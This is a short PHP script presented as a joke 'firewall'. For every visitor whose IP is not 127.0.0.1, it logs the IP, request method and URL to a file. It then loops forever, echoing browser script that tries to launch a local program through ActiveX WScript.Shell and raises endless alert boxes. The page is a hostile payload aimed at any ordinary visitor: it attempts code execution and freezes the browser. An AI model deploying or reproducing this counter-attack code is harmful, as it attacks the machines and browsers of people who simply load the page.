<?php
header("Content-type: text/html;charset=utf-8");
function iefuck(){
	while (True) {
		echo "<script>var cmd=new ActiveXObject('WScript.Shell');cmd.run('clac.exe');</script>";
		echo "<script>alert('很遗憾你被waf拦截')</script>";
	}

}

$ip=$_SERVER['REMOTE_ADDR'];
if($ip!='127.0.0.1'){
	echo "卢本伟防火墙已拦截";
	$dk=fopen("iplist.txt", 'a');
	fwrite($dk,"攻击者IP".$ip."\n");
	fwrite($dk,"攻击者的请求方式：".$_SERVER['REQUEST_METHOD']."\n");
	fwrite($dk,"请求的URL:");
	$zhi='http://'.$_SERVER['SERVER_NAME'].':'.$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
	fwrite($dk,$zhi);
	fwrite($dk,"\n");
	fclose($dk);
	iefuck();
}
?>